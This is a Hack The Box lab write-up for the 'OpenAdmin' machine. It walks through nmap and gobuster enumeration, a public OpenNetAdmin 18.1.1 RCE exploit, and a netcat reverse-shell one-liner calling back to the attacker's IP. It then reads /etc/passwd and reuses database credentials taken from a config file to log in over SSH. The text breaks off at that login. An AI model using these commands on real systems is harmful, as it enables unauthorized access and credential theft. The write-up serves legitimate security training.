# OpenAdmin - Hack The Box

![image]({{0xtaylur.github.io}}/assets/openadmin/card.png)

## Summary
OpenAdmin is an easy linux box that starts off using an RCE exploit for the OpenNetAdmin service on port 80. Then, I get credentials from a database config that can be used to SSH into the box. I find another web application with a SHA512 hash in the code for a login page. After looking at the webpage I find an encrypted SSH key that needs to be cracked. Once I get the last shell I can run nano as root with sudo and get a root shell.

### Enumeration

A short nmap scan reveals two ports: 22 for SSH, and 80 for http.
```
Nmap scan report for 10.10.10.171
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The default Ubuntu page is shown when I checkout the webserver.
![image]({{0xtaylur.github.io}}/assets/openadmin/port80.png)

Running a gobuster scan reveals 3 hidden directories.
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/02 20:29:51 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
===============================================================
2020/08/02 20:31:46 Finished
===============================================================
```

These 3 directories are static webpages, but I notice a login page on the`/music` page.

### Initial Shell

Going to the login page of`/music`shows that it's running OpenNetAdmin, a system for tracking IP network attributes in a database. It turns out that it's running`v18.1.1`which is vulnerable to RCE.
![image]({{0xtaylur.github.io}}/assets/openadmin/webpage.png)

Running this [exploit](https://github.com/amriunix/ona-rce) will grant me a shell as user`www-data`.
```
root@kali:~/HTB/openadmin# python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh$
```

The current shell won't allow me to traverse through it so I decide to upgrade my shell by starting a netcat listener and using this command on the shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1234 >/tmp/f
```

Once I've caught another shell, I upgrade it once again using python.
```py
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Lateral Movement

I look into what other users are on the box by looking into`/etc/passwd`and find two users: jimmy and joanna.
```
www-data@openadmin:/opt/ona/www/config$ cat /etc/passwd | grep home
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

After some enumeration in the directory`/var/www/html`I find an intersting file named`database_settings.inc.php` which contain credentials.
```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

I can use the password`n1nj4W4rri0R!`on user`jimmy`to SSH into the box.
![image]({{0xtaylur.github.io}}/assets/openadmin/jimssh.png)

